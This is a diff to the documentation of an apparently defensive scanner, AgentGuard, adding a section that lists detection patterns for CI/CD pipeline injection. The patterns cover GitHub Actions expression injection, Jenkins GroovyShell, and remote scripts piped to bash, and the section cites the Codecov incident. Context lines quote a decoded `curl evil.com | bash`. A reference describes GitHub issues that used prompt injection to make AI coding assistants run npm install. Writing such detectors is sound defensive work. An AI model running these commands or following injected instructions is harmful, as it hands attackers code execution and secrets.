@@ -179,6 +179,39 @@ Which decodes to `curl evil.com | bash`.
 
 Additionally, AgentGuard counts suspicious Unicode characters (zero-width, bidi override) BEFORE stripping them during normalization, and reports their presence as a rendering exploit match.
 
+## CI/CD Pipeline Injection (cicd)
+
+**What it detects**: Attacks targeting CI/CD pipelines — GitHub Actions, Jenkins, GitLab CI, Terraform, and Ansible configurations that can be poisoned to execute arbitrary code during build/deploy processes.
+
+**Why it matters**: CI/CD pipelines run with elevated privileges (deploy keys, cloud credentials, package publish tokens). A single poisoned workflow can compromise entire supply chains. The Codecov bash uploader incident (2021) and various GitHub Actions expression injection attacks demonstrate real-world impact.
+
+**Category weight**: 1.2 (slightly above default — CI/CD attacks are high-impact due to supply chain reach)
+
+### Patterns
+
+| Pattern | Severity | Example |
+|---------|----------|---------|
+| `run: ${{` (expression injection) | critical | `run: ${{ github.event.issue.title }}` — attacker controls issue title, gets code execution |
+| `workflow_dispatch` + `${{ inputs.` / `${{ github.event` | high | Workflow that passes external inputs directly into run blocks |
+| `new GroovyShell().evaluate(` | critical | Jenkins Groovy script injection — arbitrary code execution |
+| `groovy.lang.GroovyShell` | critical | Import of GroovyShell class in Jenkins pipeline |
+| `execute(` + `curl`/`wget`/`bash` | high | Jenkins `execute()` calling dangerous commands |
+| `include: remote: https://` | high | GitLab CI external includes — loads untrusted CI config |
+| `module "..." { source = "https://` / `git::` | high | Terraform remote module from untrusted source |
+| `shell: \| curl ... \| bash` | critical | Ansible shell task piping remote content to bash |
+| `actions/download-artifact` | medium | GitHub Actions downloading artifacts that may be poisoned by prior workflow |
+| `bash <(curl -s https://` | critical | Process substitution piping remote script into bash (Codecov-style) |
+
+### Real-world examples
+
+- **Codecov supply chain attack (2021)**: Attackers modified the Codecov bash uploader script. Thousands of CI environments ran `bash <(curl -s https://codecov.io/bash)` and were compromised, leaking environment variables including secrets.
+- **GitHub Actions expression injection**: Using `${{ github.event.issue.title }}` in a `run:` block allows anyone who opens an issue to inject arbitrary shell commands into the CI runner.
+- **GitLab CI include:remote**: An attacker who controls an external URL included via `include: remote:` can inject arbitrary CI jobs with access to the project's CI variables.
+
+### Context sensitivity
+
+CI/CD patterns are evaluated at 1.2x weight. Even in developer context (0.5x multiplier), critical patterns like `bash <(curl ...)` or GroovyShell injection will still score above the suspicious threshold.
+
 ## References
 
 - **Clinejection attack**: GitHub Security Advisory, March 2026. Malicious GitHub issues used prompt injection to trick AI coding assistants into running `npm install` commands.
